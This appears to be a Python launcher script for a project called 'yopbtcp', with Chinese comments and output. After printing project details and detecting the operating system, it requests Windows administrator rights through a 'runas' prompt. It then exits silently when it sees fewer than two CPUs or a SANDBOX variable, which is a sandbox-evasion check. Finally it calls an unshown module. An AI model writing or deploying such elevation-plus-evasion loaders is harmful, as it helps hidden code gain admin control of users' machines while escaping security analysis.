yoptcp_readme_xmjg = "[系统提示]"
yoptcp_readme_xmmc = "无尽炫步舞/yopbtcp"
yoptcp_readme_xmzz = "布莫ByGalxy"
yoptcp_readme_cjsj = "2025.03.25"
yoptcp_wxtskz_true = False
print('-'*30)
print("""
项目名称： %s
项目作者： %s
创建时间： %s
"""% (yoptcp_readme_xmmc, yoptcp_readme_xmzz, yoptcp_readme_cjsj))
print('-'*30)

bubm_no_system = None
print('检查操作系统...')

import platform
import os
import ctypes
import sys
import Windows.win_yopbtcp as yo

system = platform.system()
if system == 'Windows':
    print("猜测为Windows")
    bubm_no_system = 'Windows'
elif system.lower().startswith('linux'):
    print("猜测为Linux")
else:
    print(f"其它操作系统？: {system}")

if bubm_no_system == "Windows":
    # 权限自动提升
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    # 检测虚拟机环境
    if os.cpu_count() < 2 or os.getenv("SANDBOX"):
        os._exit(0)
    yo.win_yp(yoptcp_readme_xmjg, yoptcp_readme_xmmc, yoptcp_readme_xmzz, yoptcp_readme_cjsj)
else:
    print("我要睡觉觉!!!")
